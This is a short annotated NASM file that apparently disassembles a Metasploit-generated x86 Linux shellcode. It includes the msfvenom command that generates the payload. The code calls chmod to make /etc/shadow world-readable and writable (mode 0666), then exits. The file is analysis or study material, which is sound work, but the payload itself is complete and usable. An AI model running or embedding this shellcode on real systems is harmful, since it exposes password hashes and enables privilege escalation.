; chmod.nasm
;  - Analyzed shellcode from metasploit
;
; > msfvenom -a x86 --platform linux -p linux/x86/chmod FILE=/etc/shadow -f c

global _start

section .text
_start:

	cdq
	push byte +0xf
	pop eax
	push edx
	call section_2		; call pop

section_1:

	das			; /
	gs jz 0x71		; etc
	das			; /
	jnc 0x79		; sh
	popa			; a
	fs outsd		; do
	ja 0x16			; w\0

section_2:

	; int chmod(const char *pathname, mode_t mode)
	; eax = 0xf (chmod)
	; ebx = pointer to section_1
	; ecx = 0xb6010000

	pop ebx
	push dword 0x1b6
	pop ecx
	int 0x80


	; void exit(int status)
        ; eax = 0x1 (exit)
        ; ebx = 0x0

	push byte +0x1
	pop eax
	int 0x80
